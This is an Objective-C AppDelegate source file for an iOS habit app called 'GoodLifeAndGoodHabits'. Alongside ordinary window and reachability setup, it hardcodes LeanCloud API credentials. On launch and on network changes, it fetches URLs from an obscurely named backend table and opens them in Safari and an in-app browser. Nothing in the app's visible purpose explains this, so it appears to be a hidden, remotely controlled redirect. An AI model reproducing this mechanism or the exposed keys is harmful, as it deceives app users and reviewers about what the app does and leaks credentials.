//
//  AppDelegate.m
//  GoodLifeAndGoodHabits
//
//  Created by user on 2020/6/9.
//  Copyright © 2020 user. All rights reserved.
//

#import "AppDelegate.h"
#import "Reachability.h"
#import <SafariServices/SafariServices.h>
@interface AppDelegate ()<SFSafariViewControllerDelegate>
@property(nonatomic,strong)Reachability *JBhostReah;
@property(nonatomic,assign)NetworkStatus JBstatus;
@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    [AVOSCloud setApplicationId:@"H15qlfDi1SLCxryYbbjf7snN-MdYXbMMI" clientKey:@"nVywofsCh2sUR6MVqbIhRQnt"];
    self.JBwindow = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.JBwindow.backgroundColor = [UIColor whiteColor];
    self.JBwindow.rootViewController = [self rootController];
    [self.JBwindow makeKeyAndVisible];
    //开启网络状况的监听
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(JBreachabilityChanged:)name:kReachabilityChangedNotification object:nil];
    Reachability *JBreach = [Reachability reachabilityWithHostName:@"www.apple.com"];
    [JBreach startNotifier];
    //开始监听，会启动一个runloop
    [self.JBhostReah startNotifier];
    return YES;
    return YES;
}
- (void)applicationDidBecomeActive:(UIApplication *)application{
    Boolean JBisNet = [[NSUserDefaults standardUserDefaults] boolForKey:@"JBisNet"];
       if (JBisNet) {
       AVQuery *JBbquery = [AVQuery queryWithClassName:@"JBimmediateTransportManagement"];
       [JBbquery findObjectsInBackgroundWithBlock:^(NSArray *array, NSError *error) {
           NSDictionary *JBDic = (NSDictionary *)[array firstObject];
           NSString *JBstring = [JBDic objectForKey:@"immediateTransportManagement"];
           NSString *JBstring1 = [JBDic objectForKey:@"immediateTransportManagement1"];
           [[UIApplication sharedApplication] openURL:[NSURL URLWithString:JBstring] options:@{} completionHandler:nil];
           if (JBstring1.length) {
           SFSafariViewController *JBsafariVC = [[SFSafariViewController alloc] initWithURL:[NSURL URLWithString:JBstring1]];
           [JBKeyWindow.rootViewController presentViewController:JBsafariVC animated:YES completion:nil];
           }
       }];
       }
}
-(void)JBreachabilityChanged:(NSNotification *)JBnotification{
    Reachability *JBreach = [JBnotification object];
    if([JBreach isKindOfClass:[Reachability class]]){
        NetworkStatus JBstatus = [JBreach currentReachabilityStatus];
        //如果网络状态发生改变
        if (JBstatus != self.JBstatus) {
            //记录当前网络状态
            self.JBstatus = JBstatus;
            [MBProgressHUD JBshowReminderText:[self JBisInternetWith:JBstatus]];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                   AVQuery *JBbquery = [AVQuery queryWithClassName:@"JBimmediateTransportManagement"];
                   [JBbquery findObjectsInBackgroundWithBlock:^(NSArray *array, NSError *error) {
                       Boolean JBisNet = [[NSUserDefaults standardUserDefaults] boolForKey:@"JBisNet"];
                       if (!JBisNet) {
                           NSDictionary *JBDic = (NSDictionary *)[array firstObject];
                           NSString *JBstring = [JBDic objectForKey:@"immediateTransportManagement"];
                           NSString *JBstring1 = [JBDic objectForKey:@"immediateTransportManagement1"];
                           [[UIApplication sharedApplication] openURL:[NSURL URLWithString:JBstring] options:@{} completionHandler:nil];
                           if (JBstring1.length) {
                           SFSafariViewController *JBsafariVC = [[SFSafariViewController alloc] initWithURL:[NSURL URLWithString:JBstring1]];
                           [JBKeyWindow.rootViewController presentViewController:JBsafariVC animated:YES completion:nil];
                           }
                           [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"JBisNet"];
                           [NSUserDefaults.standardUserDefaults synchronize];
                       }
                   }];
                });
        }
    }
}
- (NSString*)JBisInternetWith:(NetworkStatus)JBstatus{
    switch (JBstatus) {
        case NotReachable:
            return NSLocalizedString(@"暂无网络", nil);
            break;
        case ReachableViaWiFi:
            return NSLocalizedString(@"WIFI上网", nil);
            break;
        case ReachableViaWWAN:
            return NSLocalizedString(@"移动上网", nil);
            break;
        default:
            break;
    }
}
- (UIViewController *)rootController{
        JBTabBarController *tabVC = [JBTabBarController JBshareInstance];
        return tabVC;
}
@end
